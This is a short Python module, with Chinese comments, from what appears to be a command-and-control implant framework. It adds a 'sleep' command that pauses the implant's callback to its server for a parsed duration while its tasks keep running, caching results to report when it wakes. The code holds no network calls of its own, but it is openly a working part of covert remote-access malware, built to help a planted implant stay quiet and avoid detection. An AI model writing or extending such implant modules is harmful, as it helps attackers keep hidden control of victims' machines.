"""sleep — 植入物整体睡眠(暂停回连,任务照常执行)。

用法(console 或页面模块执行):
  sleep <duration>
  duration 支持: 10s / 10m / 10h / 90(纯数字=秒) / 1h30m(组合)

效果: 主循环暂停回连 N 时长——期间已启动的任务线程照常执行,
结果暂存本地(_PENDING),醒后下一轮 cycle 一并上报 server。
睡眠中再次下发 sleep 会延长总睡眠(取更晚的截止点)。
"""

import re
import time

MODULE = {
    "desc": "植入物整体睡眠(暂停回连,任务照常执行)",
    "params": [("duration", "必填；10s / 10m / 10h / 90(秒) / 1h30m")],
}

_UNIT = {"s": 1, "m": 60, "h": 3600}


def _parse(d):
    """解析时长字符串 → 秒;无法解析返回 None。"""
    d = str(d).strip().lower()
    if not d:
        return None
    if d.isdigit():
        return int(d)
    total = 0
    for m in re.finditer(r"(\d+)([smh])", d):
        total += int(m.group(1)) * _UNIT[m.group(2)]
    return total if total > 0 else None


def run(duration):
    secs = _parse(duration)
    if secs is None or secs <= 0:
        return (f"(sleep: 无法解析时长 {duration!r}——"
                f"支持 10s / 10m / 10h / 90(秒) / 1h30m)")
    until = time.time() + secs
    # 写入主循环钩子读取的全局截止时间(globals 字符串键, minify 安全)
    globals()["_SLP_UNTIL"] = until
    return (f"(sleep: 已暂停回连 {secs}s, 截止 "
            f"{time.strftime('%H:%M:%S', time.localtime(until))}; "
            f"任务照常执行, 醒后恢复回连并上报暂存结果)")


if __name__ == "__main__":
    print("usage: sleep <10s|10m|10h|90|1h30m>")
